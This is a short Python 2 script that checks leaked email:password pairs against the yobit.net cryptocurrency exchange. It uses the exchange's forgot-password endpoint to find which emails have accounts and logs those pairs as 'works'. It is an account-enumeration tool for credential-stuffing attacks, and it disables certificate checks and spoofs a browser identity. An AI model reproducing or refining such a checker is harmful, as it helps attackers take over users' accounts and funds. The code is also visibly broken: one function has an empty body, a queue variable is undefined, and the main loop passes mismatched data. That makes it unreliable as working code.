# -*- coding: utf-8 -*-
import requests
import re
import Queue
import random
import codecs

proxy = '127.0.0.1:8888'
prozy = {
	'http': proxy,
	'https': proxy
}

requests.packages.urllib3.disable_warnings()

def getCaptcha(key):
	

def rotate(url, captcha, post):
	s = requests.session()
	while True:
		try:
			c = q.get()
			user = c.split(':')[0]
			passw = c.split(':')[1]
			work = False
			s.cookies.clear()
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
				'Accept-Encoding': 'gzip',
				'Accept': 'application/json, text/javascript, */*; q=0.01',
				'X-Requested-With': 'XMLHttpRequest',
				'Content-Type': 'application/x-www-form-urlencoded'
			}
			r = s.post(
						'https://yobit.net/ajax/system_forgot.php',
						'method=forgot&locale=en&email={0}'.format(user),
						#proxies=prozy,
						verify=False,
						headers=headers
					)
			if 'result":"OK","' in r.text or 'E-mail with the link has already been sent' in r.text:
				f = open("reg.txt", "a")
				f.write('{0}:{1}\n'.format(user, passw))
				f.close()
				print user, 'works!'
			f = open("checked.txt", "a")
			f.write('{0}\n'.format(c))
			f.close()
			q.task_done()
			del r
		except Exception, e:
			print e
	
def main():
	with codecs.open('faucets.txt', 'r', encoding='utf-8') as f:
		faucets = f.readlines()
	
	for faucet in faucets:
		f = faucet.split(':')
		rotate(f[0], f[1], f[2])
			
if __name__ == '__main__':
	main()